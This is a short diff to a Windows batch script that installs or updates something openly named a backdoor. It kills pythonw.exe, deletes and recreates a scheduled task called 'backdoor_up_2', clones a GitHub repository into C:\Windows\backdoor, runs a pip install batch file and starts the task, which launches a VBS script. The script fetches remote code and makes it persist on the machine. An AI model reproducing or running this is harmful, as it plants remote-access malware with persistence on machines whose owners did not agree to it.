@@ -9,7 +9,7 @@ if %errorlevel% neq 0 (
 schtasks /delete /tn "backdoor_up_2" /f
 
 TASKKILL /F /IM pythonw.exe
-rmdir "C:\Windows\backdoor\v2.0\v2.0" /s /q
+rmdir "C:\Windows\backdoor" /s /q
 
 
 git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
@@ -22,5 +22,6 @@ schtasks /create /tn "backdoor_up_2" /tr "C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
 cd C:\Windows\backdoor\v2.0\v2.0\
 
 call pip_install.bat
+
 
 schtasks /run /tn "backdoor_up_2"
